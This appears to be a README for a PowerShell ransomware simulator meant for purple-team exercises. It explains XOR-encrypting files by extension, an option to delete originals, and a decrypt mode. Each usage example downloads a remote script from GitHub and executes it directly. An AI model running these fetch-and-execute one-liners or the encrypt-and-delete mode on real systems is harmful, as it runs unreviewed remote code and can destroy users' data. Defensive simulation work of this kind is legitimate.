# RanSimXOR - XOR Ransomware Simulator for Purple Team

Encrypts file using XOR.

Encrypted files will be named **original_filename.ext.orn**

## Input Arguments

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Path` | `string` | ✅ | Target directory |
| `-Extensions` | `string[]` | ✅ | Extensions **without dots** (`txt`, `pdf`, `docx`) |
| `-Recurse` | `switch` | No | Search subdirectories |
| `-Delete` | `switch` | No | **⚠️‼️ Delete originals** after encryption. USE WITH CAUTION! |
| `-Decrypt` | `switch` | No | **Decrypt mode** - restores from `*.orn` |


## 📋 Usage
### ENCRYPT
#### 1. Simple - Folder only (keep original files).
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSimXOR/RanSimXOR.ps1))) -Path "C:\Test" -Extensions @("pdf","docx","txt")
```

#### 2. Recursion - Include subfolders (keep original files).
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSimXOR/RanSimXOR.ps1))) -Path "C:\Test" -Extensions @("pdf","docx","txt") -Recurse
```

#### 3. ⚠️‼️ Delete - Replace files with the encrypted files on all subfolders.
> Use with caution. Files may not be recoverable.
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSimXOR/RanSimXOR.ps1))) -Path "C:\Test" -Extensions @("pdf","docx","txt") -Recurse -Delete
```

### DECRYPT
#### Restores originals from *.orn
```
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/purpl3t34m/PT0-PAYLOADS/refs/heads/main/PS%20Scripts/RanSimXOR/RanSimXOR.ps1))) -Path "C:\Test" -Extensions @("pdf","docx","txt") -Recurse -Decrypt
```

